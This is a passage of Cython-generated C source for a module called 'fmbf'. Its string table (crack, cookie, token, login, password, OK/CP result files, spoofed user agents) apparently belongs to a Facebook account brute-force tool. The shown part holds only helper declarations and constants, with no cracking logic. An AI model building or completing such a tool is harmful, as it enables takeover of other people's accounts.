#define __Pyx_PyString_Equals __Pyx_PyUnicode_Equals
#else
#define __Pyx_PyString_Equals __Pyx_PyBytes_Equals
#endif


static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);


static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);


static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);


#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif


static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);


static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);


static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);


#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif


static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char);


static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char);


static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}


#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);


#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif


#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif


static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname);


#if PY_MAJOR_VERSION < 3
#define __Pyx_PyString_Join __Pyx_PyBytes_Join
#define __Pyx_PyBaseString_Join(s, v) (PyUnicode_CheckExact(s) ? PyUnicode_Join(s, v) : __Pyx_PyBytes_Join(s, v))
#else
#define __Pyx_PyString_Join PyUnicode_Join
#define __Pyx_PyBaseString_Join PyUnicode_Join
#endif
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION < 3
    #define __Pyx_PyBytes_Join _PyString_Join
    #else
    #define __Pyx_PyBytes_Join _PyBytes_Join
    #endif
#else
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values);
#endif


#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)


static PyObject* __Pyx_PyDict_GetItemDefault(PyObject* d, PyObject* key, PyObject* default_value);


typedef struct {
    PyObject *type;
    PyObject **method_name;
    PyCFunction func;
    PyObject *method;
    int flag;
} __Pyx_CachedCFunction;


static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#else
#define __Pyx_CallUnboundCMethod1(cfunc, self, arg)  __Pyx__CallUnboundCMethod1(cfunc, self, arg)
#endif


static PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030600B1
static CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2);
#else
#define __Pyx_CallUnboundCMethod2(cfunc, self, arg1, arg2)  __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2)
#endif


static CYTHON_INLINE int __Pyx_IterFinish(void);


static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name);


static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);


static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);


static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);


static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void);


static void __Pyx_UnpackTupleError(PyObject *, Py_ssize_t index);


#define __Pyx_unpack_tuple2(tuple, value1, value2, is_tuple, has_known_size, decref_tuple)\
    (likely(is_tuple || PyTuple_Check(tuple)) ?\
        (likely(has_known_size || PyTuple_GET_SIZE(tuple) == 2) ?\
            __Pyx_unpack_tuple2_exact(tuple, value1, value2, decref_tuple) :\
            (__Pyx_UnpackTupleError(tuple, 2), -1)) :\
        __Pyx_unpack_tuple2_generic(tuple, value1, value2, has_known_size, decref_tuple))
static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
    PyObject* tuple, PyObject** value1, PyObject** value2, int decref_tuple);
static int __Pyx_unpack_tuple2_generic(
    PyObject* tuple, PyObject** value1, PyObject** value2, int has_known_size, int decref_tuple);


static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* dict, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_is_dict);
static CYTHON_INLINE int __Pyx_dict_iter_next(PyObject* dict_or_iter, Py_ssize_t orig_length, Py_ssize_t* ppos,
                                              PyObject** pkey, PyObject** pvalue, PyObject** pitem, int is_dict);


#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif


#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif


static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);


static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);


static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);


#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);


static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);


#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif


static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);


static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);


#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif


typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);


static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);


static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);


static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);


static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);


static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif


typedef PyObject *(*__pyx_coroutine_body_t)(PyObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);


static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);


static int __Pyx_patch_abc(void);


#define __Pyx_Generator_USED
static PyTypeObject *__pyx_GeneratorType = 0;
#define __Pyx_Generator_CheckExact(obj) (Py_TYPE(obj) == __pyx_GeneratorType)
#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_GeneratorType, body, code, closure, name, qualname, module_name)
static PyObject *__Pyx_Generator_Next(PyObject *self);
static int __pyx_Generator_init(void);


static int __Pyx_check_binary_version(void);


static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);



static PyTypeObject *__pyx_ptype_4fmbf___pyx_scope_struct__metode_api = 0;
static PyTypeObject *__pyx_ptype_4fmbf___pyx_scope_struct_1_genexpr = 0;
#define __Pyx_MODULE_NAME "fmbf"
extern int __pyx_module_is_main_fmbf;
int __pyx_module_is_main_fmbf = 0;


static PyObject *__pyx_builtin_range;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_exit;
static const char __pyx_k_[] = "\n ___________          _____ _____________________\n \\_   _____/         /     \\______   \\_   _____/\n  |    __)  ______  /  \\ /  \\|    |  _/|    __)  \n  |     \\  /_____/ /    Y    \\    |   \\|     \\   \n  \\___  /          \\____|__  /______  /\\___  /   \n      \\/                   \\/       \\/     \\/      ";
static const char __pyx_k_0[] = "0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_D[] = "D";
static const char __pyx_k_E[] = "E";
static const char __pyx_k_F[] = "F";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_H[] = "H";
static const char __pyx_k_I[] = "I";
static const char __pyx_k_J[] = "J";
static const char __pyx_k_K[] = "K";
static const char __pyx_k_L[] = "L";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_N[] = "N";
static const char __pyx_k_O[] = "O";
static const char __pyx_k_P[] = "P";
static const char __pyx_k_Q[] = "Q";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_T[] = "T";
static const char __pyx_k_U[] = "U";
static const char __pyx_k_V[] = "V";
static const char __pyx_k_W[] = "W";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_Z[] = "Z";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_z[] = "z";
static const char __pyx_k_00[] = "00";
static const char __pyx_k_01[] = "01";
static const char __pyx_k_02[] = "02";
static const char __pyx_k_03[] = "03";
static const char __pyx_k_0m[] = "\033[0m";
static const char __pyx_k_CP[] = "CP";
static const char __pyx_k_IP[] = " [*] IP          : ";
static const char __pyx_k_OK[] = "OK";
static const char __pyx_k__2[] = " ";
static const char __pyx_k__4[] = " [*] ---------------------------------------------";
static const char __pyx_k_az[] = "az";
static const char __pyx_k_cp[] = "cp";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_ip[] = "ip";
static const char __pyx_k_ok[] = "ok";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_pw[] = "pw";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_xx[] = "xx";
static const char __pyx_k_0_0[] = ".0.0";
static const char __pyx_k_0_2[] = ".0.";
static const char __pyx_k_123[] = "123";
static const char __pyx_k_1_2[] = "?1";
static const char __pyx_k_200[] = "200";
static const char __pyx_k_EAA[] = "EAA";
static const char __pyx_k__13[] = " ]\n";
static const char __pyx_k__17[] = " [";
static const char __pyx_k__21[] = "";
static const char __pyx_k__23[] = "*/*";
static const char __pyx_k__24[] = ")";
static const char __pyx_k__25[] = "<=>";
static const char __pyx_k__32[] = ".";
static const char __pyx_k__36[] = "_";
static const char __pyx_k__39[] = "\n";
static const char __pyx_k__42[] = "; ";
static const char __pyx_k__46[] = "]. ";
static const char __pyx_k__48[] = "/";
static const char __pyx_k__58[] = ",";
static const char __pyx_k__61[] = "=";
static const char __pyx_k__62[] = "\r ";
static const char __pyx_k__68[] = ";";
static const char __pyx_k__69[] = "\r  ";
static const char __pyx_k__70[] = "* --> ";
static const char __pyx_k__71[] = "|";
static const char __pyx_k__72[] = "                ";
static const char __pyx_k__73[] = "  * --> ";
static const char __pyx_k__74[] = "                  ";
static const char __pyx_k__75[] = "&";
static const char __pyx_k_anj[] = "anj";
static const char __pyx_k_api[] = "api";
static const char __pyx_k_ask[] = "ask";
static const char __pyx_k_bs4[] = "bs4";
static const char __pyx_k_cok[] = "cok";
static const char __pyx_k_dev[] = "dev";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_fil[] = "fil";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_idz[] = "idz";
static const char __pyx_k_key[] = "key";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_mob[] = "mob";
static const char __pyx_k_mtd[] = "mtd";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_num[] = "num";
static const char __pyx_k_pwx[] = "pwx";
static const char __pyx_k_res[] = "res";
static const char __pyx_k_s_s[] = "%s=%s";
static const char __pyx_k_sdk[] = "sdk";
static const char __pyx_k_ses[] = "ses";
static const char __pyx_k_sig[] = "sig";
static const char __pyx_k_sub[] = "sub";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_txt[] = ".txt";
static const char __pyx_k_uid[] = "uid";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_10_2[] = "10_2";
static const char __pyx_k_1234[] = "1234";
static const char __pyx_k_CP_2[] = " - CP : ";
static const char __pyx_k_CP_3[] = "CP/";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_Main[] = "Main";
static const char __pyx_k_OK_2[] = "  OK : ";
static const char __pyx_k_OK_3[] = "OK/";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_cors[] = "cors";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_dirs[] = "dirs";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_fall[] = "fall";
static const char __pyx_k_file[] = "file";
static const char __pyx_k_flow[] = "flow";
static const char __pyx_k_fmbf[] = "fmbf";
static const char __pyx_k_host[] = "host";
static const char __pyx_k_id_2[] = " id....";
static const char __pyx_k_init[] = "__init__";
static const char __pyx_k_join[] = "join";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_logo[] = "logo";
static const char __pyx_k_loop[] = "loop";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_menu[] = "menu";
static const char __pyx_k_myua[] = "myua";
static const char __pyx_k_nama[] = "nama";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_next[] = "next";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_pass[] = "pass";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_prox[] = "prox";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_self[] = "self";
static const char __pyx_k_send[] = "send";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_0_0_2[] = ".0.0.";
static const char __pyx_k_12345[] = "12345";
static const char __pyx_k_13C75[] = "13C75";
static const char __pyx_k_13D15[] = "13D15";
static const char __pyx_k_13F69[] = "13F69";
static const char __pyx_k_13G34[] = "13G34";
static const char __pyx_k_13G36[] = "13G36";
static const char __pyx_k_14C92[] = "14C92";
static const char __pyx_k_14D27[] = "14D27";
static const char __pyx_k_14F89[] = "14F89";
static const char __pyx_k_14G60[] = "14G60";
static const char __pyx_k_1_91m[] = "\033[1;91m";
static const char __pyx_k_1_92m[] = "\033[1;92m";
static const char __pyx_k_1_93m[] = "\033[1;93m";
static const char __pyx_k_Build[] = " Build/";
static const char __pyx_k_Crack[] = "Crack";
static const char __pyx_k_CriOS[] = "CriOS/";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_after[] = "after";
static const char __pyx_k_build[] = "build";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_crack[] = "[*] [crack] ";
static const char __pyx_k_d_B_Y[] = "%d %B %Y";
static const char __pyx_k_depan[] = "depan";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_empty[] = "empty";
static const char __pyx_k_en_US[] = "en_US";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_error[] = "error";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_group[] = "group";
static const char __pyx_k_https[] = "https://";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_items[] = "items";
static const char __pyx_k_login[] = "login";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_memek[] = "memek";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_query[] = "query";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_regex[] = "regex";
static const char __pyx_k_sandi[] = "sandi";
static const char __pyx_k_shell[] = "shell";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_throw[] = "throw";
static const char __pyx_k_token[] = "\n [+] token : ";
static const char __pyx_k_total[] = " - total : ";
static const char __pyx_k_ugen2[] = "ugen2";
static const char __pyx_k_ugent[] = "ugent";
static const char __pyx_k_utf_8[] = "utf-8";
static const char __pyx_k_value[] = "value";
static const char __pyx_k_versi[] = "versi";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_10_0_2[] = "10_0_2";
static const char __pyx_k_10_1_1[] = "10_1_1";
static const char __pyx_k_10_2_1[] = "10_2_1";
static const char __pyx_k_10_3_1[] = "10_3_1";
static const char __pyx_k_10_3_2[] = "10_3_2";
static const char __pyx_k_10_3_3[] = "10_3_3";
static const char __pyx_k_13E233[] = "13E233";
static const char __pyx_k_13E238[] = "13E238";
static const char __pyx_k_14A456[] = "14A456";
static const char __pyx_k_14B100[] = "14B100";
static const char __pyx_k_14E304[] = "14E304";
static const char __pyx_k_Chrome[] = "Chrome/";
static const char __pyx_k_Mobile[] = " Mobile";
static const char __pyx_k_Status[] = " [*] Status      : ";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_c_user[] = "c_user";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_cookie[] = "cookie";
static const char __pyx_k_decode[] = "decode";
static const char __pyx_k_device[] = "device";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_fields[] = "fields";
static const char __pyx_k_folder[] = "folder";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_insert[] = "insert";
static const char __pyx_k_locale[] = "locale";
static const char __pyx_k_mbasic[] = "mbasic";
static const char __pyx_k_method[] = "\n [?] method : ";
static const char __pyx_k_mobile[] = "mobile";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_origin[] = "origin";
static const char __pyx_k_paging[] = "paging";
static const char __pyx_k_params[] = "params";
static const char __pyx_k_parser[] = "parser";
static const char __pyx_k_publik[] = "publik";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_submit[] = "submit";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_update[] = "update";
static const char __pyx_k_urutan[] = "urutan";
static const char __pyx_k_602_4_6[] = "602.4.6";
